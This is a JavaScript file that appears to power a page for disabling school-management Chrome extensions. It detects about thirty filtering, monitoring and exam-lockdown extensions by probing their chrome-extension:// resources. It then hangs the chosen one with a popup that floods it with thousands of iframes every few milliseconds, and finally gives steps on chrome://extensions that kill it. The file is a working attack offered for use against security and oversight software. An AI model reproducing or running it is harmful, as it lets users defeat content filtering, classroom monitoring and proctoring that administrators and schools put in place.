async function checkExtensionURL(url) {
    try {
      const response = await fetch(url);
      if (response.ok) {
        return true;
      } else {
        return false;
      }
    } catch (error) {
      return false;
    }
  }

  async function populateSelectOptions() {
    const selectElement = document.getElementById("iframeSelect");
    const extensions = {
      "Securly": "chrome-extension://joflmkccibkooplaeoinecjbmdebglab/fonts/Metropolis.css",
      "Securly (old)": "chrome-extension://iheobagjkfklnlikgihanlhcddjoihkg/fonts/Metropolis.css",
      "GoGuardian": "chrome-extension://haldlgldplgnggkjaafhelgiaglafanh/youtube_injection.js",
      "LANSchool": "chrome-extension://baleiojnjpgeojohhhfbichcodgljmnj/blocked.html",
      "Linewize": "chrome-extension://ddfbkhpmcdbciejenfcolaaiebnjcbfc/background/assets/pages/default-blocked.html",
      "Blocksi": "chrome-extension://ghlpmldmjjhmdgmneoaibbegkjjbonbk/pages/blockPage.html",
      "FortiGuard": "chrome-extension://igbgpehnbmhgdgjbhkkpedommgmfbeao/youtube_injection.js",
      "Cisco Umbrella": "chrome-extension://jcdhmojfecjfmbdpchihbeilohgnbdci/blocked.html",
      "ContentKeeper": "chrome-extension://jdogphakondfdmcanpapfahkdomaicfa/img/ckauth19x.png",
      "CK-Authenticator G3": "chrome-extension://odoanpnonilogofggaohhkdkdgbhdljp/img/ckauth19x.png",
      "Securly Classroom": "chrome-extension://jfbecfmiegcjddenjhlbhlikcbfmnafd/notfound.html",
      "Hapara": "chrome-extension://kbohafcopfpigkjdimdcdgenlhkmhbnc/blocked.html",
      "Hapara (new ID)": "chrome-extension://aceopacgaepdcelohobicpffbbejnfac/blocked.html",
      "iboss": "chrome-extension://kmffehbidlalibfeklaefnckpidbodff/restricted.html",
      "Lightspeed Digital Insight Agent": "chrome-extension://njdniclgegijdcdliklgieicanpmcngj/js/wasm_exec.js",
      "Lightspeed Filter Agent": "chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png",
      "Lightspeed Classroom": "chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png",
      "InterCLASS Filtering Service": "chrome-extension://jbddgjglgkkneonnineaohdhabjbgopi/pages/message-page.html",
      "InterSafe GatewayConnection Agent": "chrome-extension://ecjoghccnjlodjlmkgmnbnkdcbnjgden/resources/options.js",
      "LoiLo Web Filters": "chrome-extension://pabjlbjcgldndnpjnokjakbdofjgnfia/image/allow_icon/shield_green_128x128.png",
      "Gopher Buddy": "chrome-extension://cgbbbjmgdpnifijconhamggjehlamcif/images/gopher-buddy_128x128_color.png",
      "LanSchool Web Helper": "chrome-extension://honjcnefekfnompampcpmcdadibmjhlk/blocked.html",
      "IMTLazarus": "chrome-extension://cgigopjakkeclhggchgnhmpmhghcbnaf/models/model.json",
      "Impero Backdrop": "chrome-extension://jjpmjccpemllnmgiaojaocgnakpmfgjg/licenses.html",
      "Mobile Guardian": "chrome-extension://fgmafhdohjkdhfaacgbgclmfgkgokgmb/block.html",
      "NetSupport School Student": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/messages.json",
      "Lightspeed Alert Agent": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/main.js",
      "Lightspeed Alert Agent 2": "chrome-extension://gcjpefhffmcgplgklffgbebganmhffje/_locales/lt/in_page.js",
      "Lockdown Browser": "chrome-extension://fogjeanjfbiombghnmkmmophfeccjdki/manifest.json",
    };
    
    let hasSupportedExtensions = false;

    for (const [name, url] of Object.entries(extensions)) {
      if (await checkExtensionURL(url)) {
        const option = document.createElement("option");
        option.value = url;
        option.textContent = name;
        selectElement.appendChild(option);
        hasSupportedExtensions = true;
      }
    }
    
    if (!hasSupportedExtensions) {
      const option = document.createElement("option");
      option.value = "";
      option.textContent = "No supported extensions installed";
      selectElement.appendChild(option);
      document.getElementById("hangButton").style.display = "none";
    }
  }

  populateSelectOptions();
  
  function replaceIframes(container, iframeSrc) {
    for (var i = 0; i < 3000; i++) {
      var iframe = document.createElement('iframe');
      iframe.src = iframeSrc;
      iframe.style.width = '100%';
      iframe.style.height = '100px';
      container.appendChild(iframe);
    }
    setTimeout(function() {
      while (container.firstChild) {
        container.removeChild(container.firstChild);
      }
      replaceIframes(container, iframeSrc);
    }, 5);
  }

  function warning() {
    var overlay = document.getElementById("overlay");
    overlay.style.display = "flex";
    var iframeSelect = document.getElementById("iframeSelect");
    var selectedOption = iframeSelect.options[iframeSelect.selectedIndex].text;
    var selectedSrc = iframeSelect.value;
    var popup = window.open("", "PopupWindow", "width=100,height=100");
    var popupDocument = popup.document;
    var popupBody = popupDocument.body;
    var iframeContainer = popupDocument.createElement('div');
    iframeContainer.id = 'iframeContainer';
    popupBody.appendChild(iframeContainer);
    replaceIframes(iframeContainer, selectedSrc);
    setTimeout(function() {
      popup.close();
      var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
      var extensionURL = "chrome-extension://" + extensionId;
      var killExtensionText = document.getElementById("killExtensionText");
      killExtensionText.innerHTML = "Now that the extension <strong>" + selectedOption + "</strong> has been hanged, press the button above.";
      setTimeout(function() {
        overlay.style.display = "none";
        killExtensionText.style.display = "block";
        document.getElementById("killButton").style.display = "inline-block";
        document.getElementById("hangButton").style.display = "none";
	document.getElementById("iframeSelect").style.display = "none";
	document.getElementById("labelForIframeSelect").style.display = "none";
        document.getElementById("killButton").setAttribute("data-url", selectedSrc);
      }, 10000);
    }, 5000);
  }

  function openExtensionPopup() {
    var selectedSrc = document.getElementById("killButton").getAttribute("data-url");
    var extensionId = selectedSrc.substring(selectedSrc.indexOf("//") + 2, selectedSrc.indexOf("/", selectedSrc.indexOf("//") + 2));
    var killExtensionText = document.getElementById("killExtensionText");
    document.getElementById("killButton").style.display = "none";
    killExtensionText.innerHTML = "Keep this tab open. Then in a new tab open <strong>chrome://extensions/?id=" + extensionId + "</strong> . Scroll down a bit. Turn on and off allow access to file URLs twice. Once done, you can close both tabs. To restore the extension, flip the allow access to file URLs switch again.";
    window.location.href = selectedSrc;
  }